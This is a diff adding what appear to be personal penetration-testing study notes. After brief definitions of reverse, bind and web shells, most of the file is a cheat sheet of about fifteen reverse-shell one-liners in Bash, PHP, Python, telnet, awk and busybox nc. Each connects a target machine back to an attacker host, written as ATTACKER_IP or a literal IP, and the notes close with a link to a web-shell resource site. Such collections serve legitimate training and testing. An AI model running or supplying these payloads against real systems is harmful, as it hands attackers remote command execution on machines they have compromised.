@@ -1,0 +1,101 @@
+shell is software that allows a user to itneract with an OS, it can be GUI and this will depend on the operating system running on the system
+
+
+Reverse shell -> target system tries to connect to attacker system 
+
+Bind Shell -> bind shell will bind a port on the compromised system and listen for a connection, when this connection occurs it exposes the shell session so the attacker can execute commands remotely
+
+
+
+=== SHELL payloads
+
+==> BASH
+-> BASH
+```
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+
+-> Bash read line reverse shell
+```
+exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
+```
+
+-> Bash with file descriptor 196 reverse shell
+```
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
+```
+
+-> Bash with file descriptor 5 reverse shell
+```
+bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+```
+
+==> PHP
+-> PHP reverse shell using the exec function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+```
+
+-> PHP reverse shell using the shell_exec function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+```
+
+-> PHP Reverse Shell Using the system Function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
+```
+
+-> PHP Reverse Shell Using the passthru Function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+```
+
+-> PHP Reverse Shell Using the popen Function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
+```
+
+==> PYTHON
+-> Python Reverse Shell by Exporting Environment Variables
+```
+export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
+```
+
+-> Python Reverse Shell Using the subprocess Module
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
+```
+
+-> Short Python Reverse Shell
+```
+python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+
+==> OTHERS
+-> Telnet
+```
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
+```
+
+-> AWK
+```
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+-> Busybox
+```
+busybox nc ATTACKER_IP 443 -e sh
+```
+
+
+
+
+=== WEB Shell
+web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. 
+Web shell is ususally a file containing the code that executes commands and handles files. it can be hidden within a compromised web application or service, making it difficult to detect
+
+
+resources for web shells:  https://www.r57shell.net/index.php.
+
+
